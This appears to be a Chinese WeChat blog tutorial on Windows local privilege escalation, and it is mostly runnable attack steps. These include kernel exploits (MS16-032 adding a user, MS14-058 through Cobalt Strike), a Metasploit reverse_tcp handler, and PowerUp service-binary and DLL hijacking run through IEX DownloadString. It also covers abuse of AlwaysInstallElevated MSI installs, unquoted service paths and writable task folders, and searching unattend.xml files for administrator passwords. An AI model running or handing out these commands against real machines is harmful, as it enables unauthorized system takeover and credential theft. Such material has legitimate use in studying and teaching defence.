<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Mp-iVDq6dw9ZErv-vjHM3Q)

#### 常见权限

**USER:普通用户权限，也是系统最安全的权限(默认权限不允许修改操作系统的设置或用户资料)**

**Administrator:管理员权限，可以利用Windows的机制将自己提升为system权限，以便于操作Sam文件等等**

**System:系统权限，可以对SAM等敏感文件进行读取，提升至System权限才可以对散列值进行Dump操作**

**TrustedInstaller:最高权限，对系统文件，System权限也无法修改，只有TrustedInstaller权限才能修改**

  

提权的方式

   

纵向提权(左到右)和横向提权(下到上)

  

提权方法

*   **内核溢出漏洞提权**
    
*   **数据库提权**
    
*   **错误的系统配置提权**
    
*   **组策略首选提权**
    
*   **Web中间件漏洞提权**
    
*   **DLL劫持提权**
    
*   **滥用高权限令牌提权**
    
*   **第三方软件/服务提权**
    

  
  

系统内核溢出漏洞提权分析与防范

  

  

  

### 溢出漏洞的原理

**- 原理**

‍

### 溢出漏洞提权

**利用Windows中没有打补丁的内核溢出漏洞攻击**

*   **查看当前用户权限**
    

```
whoami /groups
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwd410YfRSDV1Bff6Lm70v7CF4qTPE0RlkwnAB1SpIicjO4T7ewm8jMHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **我的个人主机是低权限用户**

*   **查看系统内安全补丁**
    

```
systeminfo  
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

*   **与可以进行提权的内核溢出漏洞EXP进行对比**
    

**对比地址**

**找可以用的漏洞，然后看目标机器是否有补丁，没有就怼**

*   **执行EXP**
    

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwX1ib7y370tbqp1ibQrbRcJsdsibuicPVOCgdDubjNlYytUPsFRBaicicr5Rw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 利用Windows-Exploit-Suggester-master快速提权

**下载地址**

**从微软官方获取一个漏洞库**

```
python2 windows-exploit-suggester.py --update
```

**自动查询可利用**

```
python2 windows-exploit-suggester.py -d 2022-04-14-mssb.xls -i systeminfo.txt
```

**这里报错缺少xlrd库，安装发现版本高不支持xls文件，下载1.1.0版本，1.2.0亲测不行**

```
pip install xlrd==1.1.0
```

**运行成功**

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwch6XFCrYmvRJ0DBlBAe1ib0gSGcTp5iaZxEBFZYicN3ceGKJFOR3RoXCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 利用powershell中的SherLock.ps1

**下载地址**

```
Import-module .\SherLock.ps1  
find-allvulns
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwy1RE0vZpR5dykXgRsbVWdNlc3f3oX59da0u5W5xZXHJ3nlOArP9PIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**cs上配合**

**查询**

```
powershell Find-Ms14058
```

**提权**

```
elevate ms14-058 smb
```

**这里需要自己去配置exp，我是直接上传来提权的**

**查询权限**

```
getuid
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwX8hLPGhBVU5Zhfg8sBHKWr6WD73NxISps5stUWlTX9VNOrouN1RFoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 利用MSF快速提权

**开启监听模块**

```
use exploit/multi/handler
```

**添加payload**

```
set payload windows/meterpreter/reverse_tcp 
```

**配置监听地址和端口**

```
set LHOST [addr]  
set PORT  [port]
```

  

### 攻击复现

#### MS16-032

```
import-module .\ms16-032.ps1  
  
invoke-ms16-032  
  
-Application cmd.exe -commandline '/c net user 123 123 /add'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwgkUgAicCjYhTicVG7yhCCqmMUqa9a3P5TNwWIWoMC9gRpluXx5pVwE4Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**常见提权手法：CVE-2018-8120、MS16-032、MS15-051、MS14-058**

  

  

Windows 操作系统配置错误利用分析及其防范

  

  

  

  

### 系统服务权限配置错误

* * *

**Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件因此，一个低权限用户对此类操作系统调用的可执行文件具有写的权限，就可以将该文件替换为恶意文件，并随着系统服务的启动获得系统权限**

**Windows访问是以System权限运行的，因此文件夹、文件和注册表键值都是受强访问控制记住保护的，但是，某些情况下，查询中棠中仍然存在一些没用得到有效保护的服务**

  

**系统服务权限配置错误(可写目录漏洞)的可能：**

*   **服务未运行：攻击者使用任意服务替换原来的服务**
    
*   **服务已运行，且无法停止：攻击者利用DLL劫持技术并尝试重启服务来提权(大多数)**
    

  

#### PowerUp下的实战利用

* * *

**powerup提供了一些本地提权的方法，可以通过很多实用脚本来寻找目标机器的Windows服务漏洞(也是Powershell Empire和PowerSploit的一部分)**

  

**获取可利用信息**

```
powershell.exe -exec bypass -Command "& {Import-Module .\Powerup.ps1;Invoke-ALLChecks}"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QABjQccnicQq9sXKjt8GXbsiat7JKvxArwuVHFn5iaOjPU6pFicvtQTATGAbnBXliat8zQeF6CIATVSoDgcl7QqXnrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
AbuseFunction:使用方法  
Path:该服务可执行程序的路径
```

  

**利用**

```
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('C:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'rpcapd' -UserName ljwsb -Password A1B2C3..
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('C:/PowerUp.ps1');Write-ServiceBinary -ServiceName 'OpenSShd' -UserName ljwsb -Password A1B2C3..
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**理论来说重启该服务将停止运行并自动添加用户**

  

**也可以利用DLL劫持来提权**

```
Write-HijackDll -OutputFile 'C:\Program Files\OpenSSH\bin\\wlbsctrl.dll' -Command 'whoami'
```

**详情了解**

  

#### MSF-service_permission提权

**先准备一个session**

  

```
use service_permission  
  
set session 1 //1是准备好的那个  
  
set AutoRunScript migrate -f //设置自动迁移  
  
run
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**成功后会弹一个session 此时权限就是system权限**

  

### 注册表键 AlwaysInstallElevated

* * *

**注册表键是一个策略设置项，Windows允许低权限用户以System权限运行安装文件，如果启次策略设置项，那么任何权限的用户都能以 NT AUTHORITY\SYSTEM权限来安装恶意的MSI(Microsoft Windows Installer)**

  

#### PathsAlwaysInstallElevated漏洞产生原因

**产生原因是开启了Windows Installer特权安装功能**

```
gpedit.msc //组策略
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**将计算机配置和用户配置都设置为已启用**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**然后会在注册表的以下两个位置自动创建键值“1”**

```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### Windows Installer 相关

* * *

**Windows Installer是Windows操作系统组件之一，专门用来管理和配置软件访问，Windows Installer除了是一个安装程序，还用于管理软件的安装，管理软件组件的添加和删除，监视文件的还原、通过回滚进行容灾恢复等**

  

**Windows Installer分为客户端安装服务(Msiexec.exe)和MSI文件两部分，他们是一起工作的，Windows Installer 通过Msiexec.exe安装MSI文件包含的程序，MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件时需要使用大量指令和数据**

  

**Msiexec.exe用于安装MSI文件，一般在运行Microsoft Update安装更新或者安装一些软件时使用，占用内存较多，简单地说，双击MSI文件就会运行Msiexec.exe**

#### powerup 实战利用

* * *

**导入powerup模块**

```
powershell.exe -exec bypass -Command "&{Import-Module .\Powerup.ps1}"  
powershell.exe -exec bypass -Command "&{Import-Module .\Powerup.psm1}"  
powershell.exe -exec bypass -Command "&{Import-Module .\Powerup.psd1}"
```

**查询是否可用**

```
Get-RegAlwaysInstallElevated
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**生成MSI文件**

```
msiexec /q /i UserAdd.msi  
  
/quiet:禁止发送信息  
/quin:不使用GUI图形界面  
/i:安装程序
```

  

**可以直接执行**

```
Write-UserAddMSI  
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**可以在MSF上同样完成**

```
use exploiexploit/windows/local/always_install_elevated
```

**使用该模块可以生成一个随机MSI文件，并在提权后删除所有已部署的文件**

  

**只要禁用注册表AlwaysInstallElevated就可以阻止攻击者通过MSI文件来提权**

  

### 可信任服务路径漏洞

**简单来说就是一个服务的可执行文件的路径没有被双引号引导起来并且包含了空格，这个服务就是有漏洞的**

  

#### 产生原因

**Windows服务一般是以system权限运行，所以系统在解析服务所对应的文件路径中的空格时，也会以System权限运行**

  

**例如：路径是C:\ljw sb\sb ljw\sb.exe**

**那么在系统去匹配时，就有以下情况**

```
C:\ljw.exe  
C:\ljw sb\sb.exe  
C:\ljw sb\sb ljw\sb.exe
```

**Windows会依次确定和执行以上程序**

  

**所以若一个恶意文件修改好名称，服务重启时，该恶意文件就会以system权限运行(大多数情况)**

  

#### 利用

*   **检测**
    

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**我的环境并不存在**

  

**若存在进一步检测**

```
icacls [目录名]
```

**若存在everyone 且有完全控制权限的 就可以去将恶意文件写入，然后重启服务时就会以system权限运行**

  

**该漏洞也可以使用msf中的 trusted_service_path模块来渗透**

  

### 自动安装配置文件

**内网中的机器一般是批量配置部署，有些配置文件可能就会有本地管理员账号密码等信息，可以枚举来检测是否存在**

  

**可能存在的目录**

```
C:\sysprep.inf  
C:\sysprep\sysprep.xml  
C:\Windows\system32\sysprep.inf  
C:\Windows\system32\sysprep\sysprep.xml  
C:\unattend.xml  
C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Unattended.xml  
C:\Windows\Panther\Unattend\Unattended.xml  
C:\Windows\Panther\Unattend\Unattend.xml  
C:\Windows\System32\Sysprep\unattend.xml  
C:\Windows\System32\Sysprep\Panther\unattend.xml
```

**也可以这样**

```
dir /b /s C:\Unattend.xml
```

**打开XML文件可以查看是否存在密码或者base64加密后的密码**

  

**同样可以用msf中的 /post/Windows/gather/enum_unattend模块来进行渗透**

  

  

计划任务

  

  

  

#### 查看计划任务

```
schtasks /query /fo LIST /v
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### AccessChk

**SysInterals套件中的一个工具，并且是微软提供的工具，一般不会被报毒，尽量避免解除目标机器磁盘**

**下载地址**

*   **查看指定名录权限配置**
    

```
accesschk.exe -dqv "C:\Microsoft" -accepteula  
accesschk64.exe -dqv "C:\Program Files (x86)" -accepteula
```

**在高权限运行的目录存在写的权限就可以利用，下次任务开始即可运行恶意程序**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**查看存在权限配置缺陷的文件夹**

```
accesschk64.exe -uwdqsUsers c:\
```

  

**查看存在权限配置缺陷的文件**

```
accesschk64.exe -uwdqsUsers c:\*.*
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**看看结果**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**不存在**

  

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

###   

- 上一篇文章的靶机有挺多师傅来问我地址，由于最近挺忙的所有没时间看公众号后台消息，现在给各位师傅发出来

https://pan.baidu.com/s/1x1omellnOT8K3yb0t5mKOA?pwd=rlyh

提取码：rlyh

---------------------------------------

另外也创建了一个安全交流群，欢迎各位师傅来此讨论，若群满加不进，请添加运营云云  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

运营云云微信

  

  

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)